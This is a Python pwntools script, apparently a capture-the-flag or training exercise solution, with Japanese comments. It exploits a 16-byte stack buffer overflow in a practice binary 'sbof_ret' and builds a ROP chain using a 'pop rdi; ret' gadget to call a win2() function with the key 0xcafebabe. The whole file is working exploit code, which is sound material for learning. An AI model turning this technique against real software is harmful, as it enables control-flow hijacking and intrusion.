#!/usr/bin/env python3

"""
■対象ソースコード
・sbof_ret.c

■脆弱性
・標準入力で、以下のローカル変数に書き込みできるが、nameが16byteしかないため、
  スタックバッファーオーバーフローする。
	char name[0x10]

■スタックのメモリ配置
			┌───────────┐
	-0x10	│	'a' * 0x10			│
			│						│
			├───────────┤
	rbp		│	saved rbp			│
			├───────────┤
	+0x8	│	return address		│
			└───────────┘

■スタックのメモリ書き換え
			┌───────────┐
	-0x18	│	'a' * 0x10			│
			│						│
			├───────────┤
	-0x8	│	0x00000000deadbeef	│	←ダミー（何でもよい）
			├───────────┤
	rsp		│	pop rdi; ret		│	←第一引数書き換えのためのROPガジェット
			├───────────┤
	+0x8	│	0x00000000cafebabe	│	←win2()の第一引数key
			├───────────┤
	+0x10	│	win2				│
			└───────────┘
"""

from pwn import *
import sys
import struct

bin_file = './sbof_ret'
context(os = 'linux', arch = 'amd64')

context.binary = bin_file
context.terminal = ['bash', 'splitw', '-h']  # 環境に応じて変えてください
context.log_level = 'debug'  # または 'info'

binf = ELF(bin_file)
rop = ROP(binf)

def attack_35_27(conn, **kwargs):
    rdi_gadget = rop.find_gadget(['pop rdi', 'ret'])
    print(f"Found pop rdi; ret at: {hex(rdi_gadget.address)}")
    exploit =  b'a' * 0x10								# nameへの書き込み
    exploit += struct.pack('<Q', 0xdeadbeef)			# ダミー（何でもよい）
    exploit += struct.pack('<Q', rdi_gadget.address)	# 第一引数書き換えのためのROPガジェット
    exploit += struct.pack('<Q', 0xcafebabe)			# win2()の第一引数key
    exploit += struct.pack('<Q', binf.functions['win2'].address)	# win2()のアドレス
    conn.sendline(exploit)
    print(conn.recvall().decode())

def main():
    print('### attack_35_27 ###')
    conn = process(bin_file)
    attack_35_27(conn)

if __name__=='__main__':
    main()
